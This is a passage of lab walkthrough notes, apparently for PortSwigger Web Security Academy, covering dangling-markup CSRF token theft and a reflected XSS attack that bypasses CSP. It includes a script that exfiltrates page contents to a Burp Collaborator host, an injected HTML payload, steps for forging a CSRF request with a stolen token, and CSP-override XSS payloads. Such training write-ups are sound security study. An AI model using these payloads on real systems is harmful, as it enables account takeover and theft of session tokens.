3. Back in the lab, go to the exploit server and add the following code, replacing `YOUR-LAB-ID` and `YOUR-EXPLOIT-SERVER-ID` with your lab ID and exploit server ID respectively, and replacing `YOUR-COLLABORATOR-ID` with the payload that you just copied from Burp Collaborator.
```javascript
<script>
if(window.name) {
		new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
		} else {
     			location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
</script>
```
4. Click "Store" and then "Deliver exploit to victim". When the user visits the website containing this malicious script, if they click on the "Click me" link while they are still logged in to the lab website, their browser will send a request containing their CSRF token to your malicious website. You can then steal this CSRF token using Burp Collaborator.
5. Go back to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see an HTTP interaction that was initiated by the application. Select the HTTP interaction, go to the request tab, and copy the user's CSRF token.
6. With Burp's Intercept feature switched on, go back to the change email function of the lab and submit a request to change the email to any random address.
7. In Burp, go to the intercepted request and change the value of the email parameter to `hacker@evil-user.net`.
8. Right-click on the request and, from the context menu, select "Engagement tools" and then "Generate CSRF PoC". The popup shows both the request and the CSRF HTML that is generated by it. In the request, replace the CSRF token with the one that you stole from the victim earlier.
9. Click "Options" and make sure that the "Include auto-submit script" is activated.
10. Click "Regenerate" to update the CSRF HTML so that it contains the stolen token, then click "Copy HTML" to save it to your clipboard.
11. Drop the request and switch off the intercept feature.
12. Go back to the exploit server and paste the CSRF HTML into the body. You can overwrite the script that we entered earlier.
13. Click "Store" and "Deliver exploit to victim". The user's email will be changed to `hacker@evil-user.net`.

**Workflow**:
1. ![](Pasted%20image%2020250308031315.png)
2. ![](Pasted%20image%2020250308031756.png)
3. ![](Pasted%20image%2020250308031958.png)
4. now we will perform a csrf POC by changing email with hacker@evil-user.net using the victim captured CSRF token
	![](Pasted%20image%2020250308032033.png)
		![](Pasted%20image%2020250308032143.png)
		![](Pasted%20image%2020250308032215.png)

**Stage 1: Link Click Exploitation**
 *First Execution (else branch):*
    - When first executed, `window.name` is empty
    - It redirects to the victim's account page with a malicious payload in the email parameter
    - The URL-decoded payload is: `"><a href="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click me</a><base target='`
    - This injects:
        - A link that points back to the attacker's exploit server
        - A `<base target='` tag which is intentionally unclosed

*The `<base target='` Tag Trick:*
    - This unclosed tag modifies how links open in the page
    - When a user clicks any link on the page, the browser will:
        - Set the `window.name` property to the value of the incomplete `target` attribute
        - Open the link in that "named" window/frame
    - This effectively makes any clicked link store data in `window.name`

**Stage 2: Data Exfiltration**
	When the victim clicks the injected "Click me" link (or any other link), they return to the exploit server. Now:
- `window.name` contains the HTML content of the entire page they were on
- The first branch of the code executes
- It creates an image object with a source URL pointing to the attacker's Burp Collaborator
- The URL includes the encoded contents of `window.name` as a query parameter
- This sends the entire page content, including the CSRF token, to the attacker


# 26. Reflected XSS protected by CSP, with CSP bypass
This lab uses CSP and contains a reflected XSS vulnerability.
To solve the lab, perform a cross-site scripting attack that bypasses the CSP and calls the `alert` function.

Please note that the intended solution to this lab is only possible in Chrome.

**Analysis:**
1. Enter the following into the search box:
    `<img src=1 onerror=alert(1)>`
2. Observe that the payload is reflected, but the CSP prevents the script from executing.
3. In Burp Proxy, observe that the response contains a `Content-Security-Policy` header, and the `report-uri` directive contains a parameter called `token`. Because you can control the `token` parameter, you can inject your own CSP directives into the policy.
4. Visit the following URL, replacing `YOUR-LAB-ID` with your lab ID
    `https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27`

The injection uses the `script-src-elem` directive in CSP. This directive allows you to target just `script` elements. Using this directive, you can overwrite existing `script-src` rules enabling you to inject `unsafe-inline`, which allows you to use inline scripts.

Payload (HTML decoded)
```javascript
?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```

Payload (encoded)
```javascript
?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
```

**Workflow**:
1. ![](Pasted%20image%2020250308033454.png)
2. ![](Pasted%20image%2020250308033722.png)
3. bypassing the CSP by injecting our desired CSP in the token parameter(thus we can control it). This will be accomplished injecting `script-src-elem`  which overwrites existing `script-src` rules and enabling us to inject `unsafe-inline`, which will give us permission to use inline scripts.
```html
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
```
